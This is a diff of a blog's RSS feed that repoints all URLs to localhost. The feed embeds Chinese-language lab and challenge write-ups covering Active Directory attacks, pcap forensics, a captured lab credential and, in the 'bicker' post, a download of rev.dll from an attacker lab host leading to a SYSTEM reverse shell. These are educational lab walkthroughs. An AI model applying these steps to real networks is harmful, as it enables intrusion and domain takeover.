-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-4.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-4.png&#34;
 	
 	
 	
@@ -1067,10 +1671,10 @@
         </item>
         <item>
         <title>sweep-wp</title>
-        <link>https://wackymaker.github.io/post/sweep-htb/</link>
+        <link>http://localhost:1313/post/sweep-htb/</link>
         <pubDate>Wed, 27 Aug 2025 23:00:26 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/sweep-htb/</guid>
+        <guid>http://localhost:1313/post/sweep-htb/</guid>
         <description>&lt;h2 id=&#34;机器简介&#34;&gt;机器简介
 &lt;/h2&gt;&lt;p&gt;一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩&lt;/p&gt;
 &lt;p&gt;机器在开始前附带信息如下&lt;/p&gt;
@@ -1183,7 +1787,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        Lansweeper$                     Lansweeper Actions
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        NETLOGON                        Logon server share 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;smb存在匿名，DefaultPackageShare$特殊目录当中只有一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image.png&#34;
 	
 	
 	
@@ -1317,7 +1921,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 49S
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250827100014_bloodhound.zip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个用户没有出站，但是能看到有个额外的域管，或许后面会有用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-1.png&#34;
 	
 	
 	
@@ -1327,7 +1931,7 @@
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;ssh蜜罐&#34;&gt;ssh蜜罐
 &lt;/h2&gt;&lt;p&gt;这个用户局外没什么用了，用来登陆管理平台试试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-2.png&#34;
 	
 	
 	
@@ -1336,7 +1940,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这个用户并不够权限执行我枚举到的后台shell利用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-3.png&#34;
 	
 	
 	
@@ -1366,7 +1970,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Host key &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/wackymaker/.local/share/sshesame/host_ed25519_key&amp;#34;&lt;/span&gt; not found, generating it
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Listening on 10.10.16.22:2222
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在扫描凭证-添加扫描目标中，选择扫描ip范围，选定我们蜜罐的范围，并选择2222端口（只显示22是因为它只显示两位数字）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-4.png&#34;
 	
 	
 	
@@ -1375,7 +1979,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且在扫描凭据这里，将凭据映射绑定到ip范围的linux主机上，这样它就会利用保存凭证进行ssh登陆我们的蜜罐&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-5.png&#34;
 	
 	
 	
@@ -1438,7 +2042,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:INVENTORY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:sweep.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sweep.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;vc_inventory_lnx:0|5m-U6?/uAX
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存在权限但是没有winrm，回头这个用户的猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-6.png&#34;
 	
 	
 	
@@ -1447,7 +2051,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;有出站，可以将自己添加入LANSWEEPER ADMINS组，并且LANSWEEPER ADMINS组属于远程管理组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-7.png&#34;
 	
 	
 	
@@ -1584,10 +2188,10 @@
         </item>
         <item>
         <title>OpTinselTrace4-wp</title>
-        <link>https://wackymaker.github.io/post/optinseltrace4/</link>
+        <link>http://localhost:1313/post/optinseltrace4/</link>
         <pubDate>Wed, 27 Aug 2025 14:56:36 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/optinseltrace4/</guid>
+        <guid>http://localhost:1313/post/optinseltrace4/</guid>
         <description>&lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;打印机在圣诞老人的工作室中很重要，但我们还没有真正尝试确保它们的安全！格林奇和他的精英黑客团队可能会试图利用它来对付我们！请使用提供的数据包捕获进行调查！打印机服务器 IP 地址为 192.168.68.128 请注意 - 这些 Sherlocks 是按顺序完成的！&lt;/p&gt;
 &lt;p&gt;附件信息&lt;/p&gt;
@@ -1598,7 +2202,7 @@
 &lt;h2 id=&#34;攻击ip地址为&#34;&gt;攻击ip地址为？
 &lt;/h2&gt;&lt;p&gt;题目原文（网络打印机服务器的性能变得缓慢，导致北极车间的工作流程中断。圣诞老人指示我们生成支持请求并检查网络数据以查明问题的根源。他怀疑格林奇和他的团队可能参与了这种情况。您能否验证是否有向打印机服务器发送过多流量的 IP 地址？）&lt;/p&gt;
 &lt;p&gt;打开文件包，一共3800多个包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image.png&#34;
 	
 	
 	
@@ -1607,7 +2211,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;提供给了我们打印机的ip地址，只需要过滤出打印机ip就能找到请求最多的ip&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-1.png&#34;
 	
 	
 	
@@ -1619,7 +2223,7 @@
 &lt;h2 id=&#34;最终攻击端口&#34;&gt;最终攻击端口
 &lt;/h2&gt;&lt;p&gt;题目原文（Bytesparkle 作为技术负责人，发现了来自先前攻击中识别的同一 IP 的端口扫描痕迹。然后，哪个端口是打印机最初入侵的目标？）&lt;/p&gt;
 &lt;p&gt;过滤攻击ip，并锁定初步攻击时的流量包，我们能找到攻击者对9100端口进行了大量访问&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-2.png&#34;
 	
 	
 	
@@ -1630,7 +2234,7 @@
 &lt;p&gt;答案；9100&lt;/p&gt;
 &lt;h2 id=&#34;服务器上运行的打印机的全名是什么&#34;&gt;服务器上运行的打印机的全名是什么？
 &lt;/h2&gt;&lt;p&gt;随便找几个9100的包追踪tcp，我们能找到如下文本&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-3.png&#34;
 	
 	
 	
@@ -1641,7 +2245,7 @@
 &lt;p&gt;答案： Northpole HP LaserJet 4200n&lt;/p&gt;
 &lt;h2 id=&#34;格林奇截获了一份圣诞老人制作的善良和顽皮孩子的名单好名单上的第二个孩子叫什么名字&#34;&gt;格林奇截获了一份圣诞老人制作的善良和顽皮孩子的名单。好名单上的第二个孩子叫什么名字？
 &lt;/h2&gt;&lt;p&gt;并不太理解打印机流量数据中的内容，于是我继续分析刚才追踪的tcp，找到了类似名单的东西&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-4.png&#34;
 	
 	
 	
@@ -1667,7 +2271,7 @@
 &lt;/h2&gt;&lt;p&gt;题目原文（格林奇获得了一份打印作业指令文件，该文件用于一位名叫埃尔芬的员工使用的打印机。看来圣诞老人和北极管理团队已经做出了解雇 Elfin 的决定。您能否提供终止 Elfin 雇佣关系的决定背后的逐字理由？）&lt;/p&gt;
 &lt;p&gt;我们过滤data字段，查找和这个id有关的包&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data contains &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Elfin&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-5.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-5.png&#34;
 	
 	
 	
@@ -1680,7 +2284,7 @@
 &lt;p&gt;答案：The addressed employee is confirmed to be working with grinch and team. According to Clause 69 , This calls for an immediate expulsion.&lt;/p&gt;
 &lt;h2 id=&#34;计划打印作业的名称是什么&#34;&gt;计划打印作业的名称是什么？
 &lt;/h2&gt;&lt;p&gt;过滤Job,我们能找到大约几十个流量包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-6.png&#34;
 	
 	
 	
@@ -1691,7 +2295,7 @@
 &lt;p&gt;随便点一个追踪流，可惜都是打印机的打印任务，找不到有用的，但是我意识到计划任务应该会有start关键词&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data contains &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Start&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只有一个数据包，但是当中存在我们需要的内容&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-7.png&#34;
 	
 	
 	
@@ -1704,7 +2308,7 @@
 &lt;/h2&gt;&lt;p&gt;题目（在我们对当前数据包捕获的持续分析中，情况已经惊人地升级。我们的安全系统在一台高度关键的服务器上检测到了漏洞利用后活动的迹象，该服务器本应通过仅使用 SSH 密钥进行安全访问。这一事态发展引起了安全团队的严重担忧。在 Bytesparkle 调查此次违规行为时，他推测此次安全事件可能与早期的打印机问题有关。您能否确定并提供打印机服务器上使格林奇能够横向移动到此关键服务器的文件的完整路径？）&lt;/p&gt;
 &lt;p&gt;看来关键在于ssh&lt;/p&gt;
 &lt;p&gt;过滤后发现与上一题tcp流一致，都在46流&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-8.png&#34;
 	
 	
 	
@@ -1723,7 +2327,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;答案：christmas.gifts&lt;/p&gt;
 &lt;h2 id=&#34;格林奇什么时候试图从打印机中删除文件utc&#34;&gt;格林奇什么时候试图从打印机中删除文件？（UTC）
 &lt;/h2&gt;&lt;p&gt;这道题我找了很久，并不在28或者46流，当过来吧DELETE后我们找到了结果&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-9.png&#34;
 	
 	
 	
@@ -1737,10 +2341,10 @@
         </item>
         <item>
         <title>bicker-wp</title>
-        <link>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</link>
+        <link>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</link>
         <pubDate>Mon, 25 Aug 2025 15:15:18 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
+        <guid>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
         <description>&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
 &lt;/h2&gt;&lt;p&gt;主机确认&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/bicker&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -1788,7 +2392,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 192.168.174.143:9389
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口&lt;/p&gt;
 &lt;h2 id=&#34;突破边界&#34;&gt;突破边界
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image.png&#34;
 	
 	
 	
@@ -1797,7 +2401,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;存在smb匿名，直接连接puppy，发现一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-1.png&#34;
 	
 	
 	
@@ -1806,7 +2410,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;一张意义不明的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-2.png&#34;
 	
 	
 	
@@ -1849,7 +2453,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Image Size                      : 620x381
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Megapixels                      : 0.236
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其中发现bilibili以及uid关键字，去b站查找到定位账号&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-3.png&#34;
 	
 	
 	
@@ -1903,7 +2507,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定&lt;/p&gt;
 &lt;p&gt;tindalos并未有稳定的出站，但是我找到了一个有意思的组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-4.png&#34;
 	
 	
 	
@@ -1975,7 +2579,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username    : lihua
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unknown     : hello%2633
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功解密出lihua的账户密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-5.png&#34;
 	
 	
 	
@@ -1984,7 +2588,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且能成功登陆，查看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-6.png&#34;
 	
 	
 	
@@ -1994,7 +2598,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &amp;lt;DC_IP&amp;gt; -d &amp;lt;域名&amp;gt; -u &amp;lt;管理员用户名&amp;gt; -p &amp;lt;管理员密码&amp;gt; set password &amp;lt;目标用户&amp;gt; &amp;lt;新密码&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-7.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-7.png&#34;
 	
 	
 	
@@ -2003,7 +2607,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用修改账号密码登陆&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-8.png&#34;
 	
 	
 	
@@ -2029,7 +2633,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.174.129/rev.dll&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\wirteTEMP\rev.dll&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是使用古法上传，之后利用tindalos注册此dll&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-9.png&#34;
 	
 	
 	
@@ -2039,7 +2643,7 @@
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意这一步是无法回头的，注意快照
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在jianyin用户上重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-10.png&#34;
 	
 	
 	
@@ -2048,7 +2652,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从另外一边的监听直接接受shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-11.png&#34;
 	
 	
 	
@@ -2057,7 +2661,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;权限为system成功获取rootflag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-12.png&#34;
 	
 	
 	
@@ -2070,16 +2674,16 @@
         </item>
         <item>
         <title>Origins-wp</title>
-        <link>https://wackymaker.github.io/post/origins-htb/</link>
+        <link>http://localhost:1313/post/origins-htb/</link>
         <pubDate>Sat, 23 Aug 2025 18:11:16 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/origins-htb/</guid>
+        <guid>http://localhost:1313/post/origins-htb/</guid>
         <description>&lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;最近在福雷拉发生了一起重大事件。大约 20 GB 的数据从内部 s3 存储桶中被盗，攻击者现在正在勒索 Forela。在根本原因分析过程中，怀疑 FTP 服务器是攻击的来源。发现该服务器也遭到入侵，一些数据被盗，导致整个环境进一步受到损害。系统会向您提供最小的 PCAP 文件。您的目标是查找暴力破解和数据泄露的证据。&lt;/p&gt;
 &lt;h2 id=&#34;攻击者ip地址&#34;&gt;攻击者ip地址
 &lt;/h2&gt;&lt;p&gt;解压提供给我们的zip获取ftp.pcap流量包&lt;/p&gt;
 &lt;p&gt;wireshark打开后显示出了题目给的547个数据包，由于提示了ftp以及爆破，我们直接过滤ftp.request.command查看ftp流量中请求命令
-&lt;img src=&#34;https://wackymaker.github.io/origins/image-2.png&#34;
+&lt;img src=&#34;http://localhost:1313/origins/image-2.png&#34;
 	
 	
 	
@@ -2093,7 +2697,7 @@
 &lt;/h2&gt;&lt;p&gt;将得到的ip去ip38查询&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://www.ip38.com/
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果是印度的孟买&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-3.png&#34;
 	
 	
 	
@@ -2103,7 +2707,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;答案:Mumbai&lt;/p&gt;
 &lt;h2 id=&#34;备份服务器使用了哪个-ftp-应用程序输入全名和版本格式名称版本&#34;&gt;备份服务器使用了哪个 FTP 应用程序？输入全名和版本。（格式：名称版本）
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-4.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-4.png&#34;
 	
 	
 	
@@ -2115,7 +2719,7 @@
 &lt;p&gt;答案:vsFTPd 3.0.5&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已对服务器发起暴力攻击此攻击何时开始&#34;&gt;攻击者已对服务器发起暴力攻击。此攻击何时开始？
 &lt;/h2&gt;&lt;p&gt;在第一题中，我们已经能从显示中看出目标的爆破过程，详细打开第一个包，我们能看到第一次攻击的UTC&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-5.png&#34;
 	
 	
 	
@@ -2126,7 +2730,7 @@
 &lt;p&gt;答案:2024-05-03 04:12:54&lt;/p&gt;
 &lt;h2 id=&#34;授予攻击者访问权限的正确凭据是什么格式用户名密码&#34;&gt;授予攻击者访问权限的正确凭据是什么？（格式用户名：密码）
 &lt;/h2&gt;&lt;p&gt;我们从ftp请求命令往下滑看到爆破者尝试的最后一个凭证信息&lt;/p&gt;
